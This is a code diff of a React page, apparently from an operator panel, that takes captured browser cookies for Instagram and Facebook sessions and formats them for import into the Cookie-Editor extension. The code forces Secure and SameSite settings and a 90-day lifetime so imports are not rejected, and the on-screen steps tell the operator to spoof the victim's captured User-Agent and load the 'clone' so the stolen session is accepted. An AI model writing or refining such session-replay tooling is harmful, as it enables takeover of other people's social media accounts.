@@ -235,48 +235,37 @@ export default function SessionsPage() {
     const info = accountMap[selectedSession.id];
     const targetDomain = info?.domain.toLowerCase() || "";
     
-    // BALANCED FILTER: Allow target domain + linked auth domains
-    // This ensures SSO flows (FB -> IG) remain intact.
+    // DEEP MIRROR FILTER: Target + Auth Parents
     const filteredCookies = cookies.filter(c => {
       const d = c.domain.toLowerCase();
       const n = c.name;
       
-      // BLACKLIST: Specifically target problematic tracking cookies that fail imports
-      // adding sp_id.9ec1 and others found in screenshots
-      const noisyNames = ["fr", "tr", "_fbp", "ar_debug", "_ga", "_gid", "test_cookie", "ps_l", "ps_n"];
-      if (noisyNames.some(b => b === n || n.startsWith("sp_id."))) return false;
+      // Blacklist known tracking noise that blocks imports
+      const blacklist = ["fr", "tr", "_fbp", "ar_debug", "_ga", "_gid", "ps_l", "ps_n"];
+      if (blacklist.some(b => b === n)) return false;
 
-      // Allow platform cookies
+      // Inclusive check for Instagram/Facebook complex
       if (targetDomain.includes("instagram")) {
-          // Instagram needs instagram.com and essential facebook.com sessions
           return d.includes("instagram.com") || d.includes("facebook.com");
-      }
-      if (targetDomain.includes("facebook")) {
-          return d.includes("facebook.com") || d.includes("messenger.com");
       }
       return d.includes(targetDomain);
     });
 
     const formatted = filteredCookies.map(c => {
       const isHost = c.name.startsWith("__Host-");
-      const isSecure = c.name.startsWith("__Secure-");
-      
-      // PERSISTENCE: 90 Days
       const farFuture = Math.floor(Date.now() / 1000) + 86400 * 90;
 
       return {
-        // RFC 6265bis: __Host- MUST NOT have a domain attribute
         domain: isHost ? "" : (c.domain.startsWith('.') ? c.domain : '.' + c.domain),
         expirationDate: farFuture,
         hostOnly: isHost ? true : !c.domain.startsWith("."),
         httpOnly: c.http_only,
         name: c.name,
         path: isHost ? "/" : (c.path || "/"),
-        // SECURE-SAMESITE HARMONY: 
-        // Modern browsers require Secure=true if SameSite=None (no_restriction)
-        // If we don't set Secure:true, the cookie is SILENTLY REJECTED.
+        // THE MAGIC FIX: Modern Chrome requires Secure=true to accept SameSite=None (no_restriction)
+        // If we don't force BOTH, the mirror is rejected silently.
         sameSite: "no_restriction", 
-        secure: true, // FORCE SECURE for 100% acceptance of the Mirror
+        secure: true, 
         session: false,
         storeId: c.store_id || "0",
         value: c.value
@@ -412,7 +401,7 @@ export default function SessionsPage() {
                   {[
                     { step: "01", title: "Match User-Agent", desc: "Use 'User-Agent Switcher' extension. Paste the exact UA captured in the panel." },
                     { step: "02", title: "Clean Start", desc: "Open a new tab at the target site (e.g., instagram.com) BEFORE importing." },
-                    { step: "03", title: "Import Clone", desc: "In Cookie-Editor, use 'Import' and paste the Safe JSON. Click 'Import' again." },
+                    { step: "03", title: "Limpieza Total", desc: "USA EL ICONO DE BASURA en Cookie-Editor para borrar cookies anteriores ANTES de importar." },
                     { step: "04", title: "Persistence", desc: "Refresh the page. The session should be recognized as a local 1:1 mirror." }
                   ].map((item, idx) => (
                     <div key={idx} className="flex gap-6 items-start">
